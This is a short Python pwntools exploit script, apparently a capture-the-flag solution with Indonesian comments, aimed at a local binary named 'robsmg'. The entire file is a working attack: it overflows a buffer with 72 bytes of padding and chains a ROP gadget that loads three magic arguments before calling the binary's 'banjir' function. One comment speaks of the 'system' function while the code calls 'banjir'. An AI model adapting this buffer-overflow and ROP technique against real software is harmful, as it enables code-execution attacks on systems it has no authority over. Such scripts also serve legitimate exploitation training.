from pwn import *

elf = context.binary = ELF('../src/robsmg')
rop = ROP(elf)

io = process(elf.path)
# io = remote('localhost', 11002)

# mencari gadget yang dapat digunakan
pop_rdi_rsi_rdx = rop.find_gadget(['pop rdi', 'pop rsi', 'pop rdx', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]   

# mencari alamat fungsi system
banjir = elf.sym.banjir

payload = b'A'* 72 + p64(pop_rdi_rsi_rdx) + p64(0xdeadbeef) + p64(0xdeadc0de) + p64(0xbaddc0de) + p64(banjir)

io.sendline(payload)
print(io.recvall().decode())